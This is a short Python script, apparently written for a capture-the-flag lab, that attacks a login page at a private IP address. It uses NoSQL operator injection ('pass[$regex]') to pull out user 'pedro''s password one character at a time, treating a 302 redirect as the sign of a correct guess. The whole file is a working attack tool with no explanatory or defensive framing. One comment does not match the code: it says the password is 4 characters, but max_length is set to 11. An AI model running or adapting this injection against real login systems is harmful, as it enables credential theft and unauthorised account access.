import requests
import string

# Target URL
url = "http://10.10.123.171/login.php"

# Headers
headers = {
    "Host": "10.10.123.171",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.123.171",
    "Connection": "keep-alive",
    "Referer": "http://10.10.123.171/",
    "Cookie": "PHPSESSID=2j8v8s9atem0ks7a6gtpmmedgk",
    "Upgrade-Insecure-Requests": "1"
}

def try_password_regex(prefix):
    data = {
        "user": "pedro",
        "pass[$regex]": f"^{prefix}.*$",
        "remember": "on"
    }
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return response

def brute_force_password():
    charset = string.ascii_letters + string.digits  # Only letters and numbers
    password = ""
    max_length = 11  # Since the password is 4 characters long
    
    for i in range(max_length):
        for char in charset:
            test_pass = password + char
            response = try_password_regex(test_pass)
            location_header = response.headers.get("Location", "")
            
            if response.status_code == 302 and location_header != "/?err=1":
                password += char
                print(f"[+] Found character {i+1}: {char} => {password}")
                break
        else:
            print("[!] No matching character found. Stopping.")
            break
    
    print(f"[+] Final password: {password}")

if __name__ == "__main__":
    brute_force_password()
